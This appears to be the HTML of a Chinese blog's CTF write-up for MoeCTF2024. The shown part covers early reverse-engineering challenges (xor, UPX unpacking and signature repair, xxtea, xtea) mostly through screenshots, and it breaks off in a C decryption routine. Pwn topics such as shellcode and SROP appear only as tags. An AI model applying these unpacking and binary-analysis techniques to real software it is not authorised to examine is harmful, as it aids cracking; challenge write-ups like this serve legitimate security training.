

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="j1ya">
  <meta name="keywords" content="">
  
    <meta name="description" content="Re入门指北  xor    upx  dynamic第一个函数就是加密函数   xxtea   在最后result下断点，然后去看a1数组   upx_revenge修改特征码vmp为UPX     xtea这题由于密文只有三组，中间一组会经过两次解密   1234567891011121314151617181920212223242526272829303132#include &lt;st">
<meta property="og:type" content="article">
<meta property="og:title" content="MoeCTF2024部分Re与Pwn">
<meta property="og:url" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/index.html">
<meta property="og:site_name" content="j1ya">
<meta property="og:description" content="Re入门指北  xor    upx  dynamic第一个函数就是加密函数   xxtea   在最后result下断点，然后去看a1数组   upx_revenge修改特征码vmp为UPX     xtea这题由于密文只有三组，中间一组会经过两次解密   1234567891011121314151617181920212223242526272829303132#include &lt;st">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723263301340-fcca3831-c2da-4c5f-a04d-842ce835c2c3.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273162689-e73d74b2-e945-4f1a-9f31-70d830aec1db.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273152970-ffbb12bc-03ee-457d-a9d5-0545bf3edf76.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886477905-248a3059-0117-45dc-85fe-c0ad57fe3003.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886744368-63b88a1c-b933-44f2-82e9-47dc1ba38adb.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886633287-b0a152ab-b531-4533-b4b0-34e30e17de92.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886715827-80f46a61-4abb-437f-8efe-43823463a476.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886953397-6e5e2571-8407-4c99-8393-ddfa328d772f.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723887048654-5d7ee7a7-75ff-497b-bb19-0967ca86c63e.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724069557932-4f6bf624-f24d-48c2-ba82-e0e3e582318a.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724070504922-2f26684c-27cd-46cf-b0bb-34818b25de07.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724070539054-06914e00-9eae-4a64-a78c-c3cbe94b80f7.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134162023-5d4880da-855e-43ea-a0b3-e897d861cf92.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134016809-38a78bb2-b62d-4b60-9f41-46c94c599146.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724134037564-32a76006-a2cf-4e55-90f8-55220d070aa7.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273913162-1f2fc05c-7205-4979-b6ca-8a5f6cda1c6f.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273875357-9cc404c0-2560-4986-b82d-85afe80b2650.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723272863336-615d073c-62bf-4b9d-8449-0d4ac9ea810c.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724136823247-4cdf7e68-d4fa-4e52-bb58-18b8af598597.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724158570823-42595b04-7841-416b-b72d-103875251e17.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724231033107-e06ceffd-7d82-49af-9660-e9ea668816c9.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724144757695-5141af2c-9c55-43a9-a4d2-c56ffa3e62d4.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724144769981-14f1d7ba-a31c-4edb-ac48-8723e5e0bece.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724228737010-235a7104-10ec-47aa-9b54-9978af1259d8.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724461159260-6c09856e-a8b9-427e-a292-714d8ba0af37.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724461125455-3822aed3-e8dd-435c-8d2a-b45ca00f2ce9.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724468535615-5af557bb-3d5b-4b4e-b21c-d47da3b9f0c1.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724469127727-6b6389b4-f381-4331-9bbf-0ea6697dee34.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724472342291-10eaa4b2-d305-4504-9984-6d97e67bb432.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724472556548-3ffe5532-4c5c-408c-88b1-7162c73af94f.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724511920066-c8aa02db-2683-46eb-9d0e-a56fe3bb7a01.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724550601096-d661329a-fd5c-4eb7-b75c-4e53550dfd67.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724642186848-ba9a7fd4-1481-46eb-a468-999ca49ed09d.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724480966167-4da06b90-0272-46bc-8c06-6fb8d3f46ada.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724480982752-32ee9808-4d52-46a3-9faa-c35ab1aa5a49.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724679306184-55d2be46-1f9f-42a2-937c-1b0513d92d4e.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724813588701-fddd2816-33a7-40d6-8d42-e0a2ae6029ea.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724827254498-19e8c8a8-5eb3-4534-a704-e2441493beaa.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724827974635-2f61db70-4857-467b-8fda-e9511a9746fb.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723275505793-96bed9fe-45c9-4f68-83fb-4695676721f3.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794082239-1f5187f0-1d2c-4d59-b427-1cc80757b37e.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794067248-dfc751dc-3e6c-4f15-a2b0-6f79c39cad3e.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794193586-b9dcc0cd-276e-44d1-94bb-83d9113bfad1.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794288624-396fbbc5-8493-48cc-840e-498c2fd2bf3c.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723795016076-4fcc7ef5-fe44-4887-9f60-7d7b3beca049.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794998339-b10e992b-c73a-4ef5-9ba5-2bc5a557cda7.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723949889550-5afdc433-ff84-47cc-8481-3e6b65b3335a.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724832562212-3d248860-6178-4047-8cfe-10c27dbb9dce.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724161326570-4e6be3d3-524d-4567-b464-38a877d1fdec.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724161138144-4d81b94a-08f2-402b-8459-b715d00b61b9.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724162238375-c925b571-bba9-4c15-9c36-201c917c1dcf.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724310928181-2c3ef0d4-bbf6-4b1b-8366-b0b98806b806.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724312564780-41636bf7-54b3-40eb-b12d-83adb5bb5d7a.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380176738-e0b153c0-d43f-4c63-aa95-49391ee58424.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380241829-f415a6cc-ebba-4b08-b123-43ae15ce2f20.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380762344-07d413bc-89e7-42e2-87b4-6d9a14bf68b6.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380290986-a3acea4f-9120-4f07-aa42-a25c0ed30f01.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727427480249-4165aa13-80c7-405f-acb4-ea6e14c9a8f6.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727449908854-6374d9ba-ba25-45f4-bc6f-fe1f69a1cc1e.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727487798647-80d809db-c31a-473a-9a24-38910e0178a7.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727492987385-25589b18-be35-4b44-bbbb-09e1e6698595.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727495663055-19e07821-3172-4245-97d6-a8cb6f3a1dcf.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727529028621-a6ba0d7f-e6a0-4857-9346-ca328fc26a00.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727531030045-42d0368b-fca3-4c7f-99fe-b973f5573f40.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723452710680-d24b362c-afec-48e0-bb71-76b8c998e036.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723442517386-40a34cfe-0f2e-4e3f-85f3-f710611ac63c.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724253292780-bfc577e4-df1f-49df-9225-b6d7233e350a.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724291160818-e2df3ce1-093a-4141-900f-a2399b4b8ace.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724297766310-baa106b1-aeb1-4079-be94-d45bbe403f00.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724290549088-05b11161-b092-46c9-83cf-2dd68ceca901.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724308251808-36acb53a-3495-4c9a-ac1b-6ef06228eec7.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723464821414-4d2f325a-c38d-4865-8d9b-9589a60a840b.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465094787-80ce1c5a-4cd8-40f5-967e-b2f999556058.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465110295-856994d2-cc1a-4a01-ba87-652deeaea894.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723465443987-dbe8d25a-9831-4b8f-8d5d-ab5782a5cfe6.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727671790676-7b01f6af-ee3f-4d0b-b940-268858a41f5c.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1725765690130-cc3530a1-a25e-4dc7-a068-0fd65d5198b9.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1725765705563-5150f599-e587-464f-b35f-5aedc6999025.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727671828625-3f15e4d3-83aa-48e8-a4be-21e176fa9e93.png">
<meta property="og:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723540870980-9f33a9a2-4215-4363-9bb5-b5dea8b74912.png">
<meta property="article:published_time" content="2024-10-12T02:45:34.000Z">
<meta property="article:modified_time" content="2025-04-22T02:05:17.324Z">
<meta property="article:author" content="j1ya">
<meta property="article:tag" content="z3">
<meta property="article:tag" content="tea魔改">
<meta property="article:tag" content="cython">
<meta property="article:tag" content="栈迁移">
<meta property="article:tag" content="sm4加密">
<meta property="article:tag" content="shellcode">
<meta property="article:tag" content="迷宫">
<meta property="article:tag" content="反调试">
<meta property="article:tag" content="e语言">
<meta property="article:tag" content="爆破flag">
<meta property="article:tag" content="格式化字符串">
<meta property="article:tag" content="SROP">
<meta property="article:tag" content="RSA">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://j1ya-22.github.io/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723263301340-fcca3831-c2da-4c5f-a04d-842ce835c2c3.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>MoeCTF2024部分Re与Pwn - j1ya</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"j1ya-22.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","app_key":"tdZv3tC3tP1IszSKxEodRe6e","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>j1ya</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="MoeCTF2024部分Re与Pwn"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-10-12 10:45" pubdate>
          2024年10月12日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.1k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          52 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">MoeCTF2024部分Re与Pwn</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="入门指北"><a href="#入门指北" class="headerlink" title="入门指北"></a>入门指北</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723263301340-fcca3831-c2da-4c5f-a04d-842ce835c2c3.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273162689-e73d74b2-e945-4f1a-9f31-70d830aec1db.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723273152970-ffbb12bc-03ee-457d-a9d5-0545bf3edf76.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886477905-248a3059-0117-45dc-85fe-c0ad57fe3003.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="dynamic"><a href="#dynamic" class="headerlink" title="dynamic"></a>dynamic</h2><p>第一个函数就是加密函数</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886744368-63b88a1c-b933-44f2-82e9-47dc1ba38adb.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>xxtea</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886633287-b0a152ab-b531-4533-b4b0-34e30e17de92.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>在最后result下断点，然后去看a1数组</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886715827-80f46a61-4abb-437f-8efe-43823463a476.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="upx-revenge"><a href="#upx-revenge" class="headerlink" title="upx_revenge"></a>upx_revenge</h2><p>修改特征码vmp为UPX</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723886953397-6e5e2571-8407-4c99-8393-ddfa328d772f.png" srcset="/img/loading.gif" lazyload class="" title="img">

<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723887048654-5d7ee7a7-75ff-497b-bb19-0967ca86c63e.png" srcset="/img/loading.gif" lazyload class="" title="img">

<h2 id="xtea"><a href="#xtea" class="headerlink" title="xtea"></a>xtea</h2><p>这题由于密文只有三组，中间一组会经过两次解密</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724069557932-4f6bf624-f24d-48c2-ba82-e0e3e582318a.png" srcset="/img/loading.gif" lazyload class="" title="img">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span 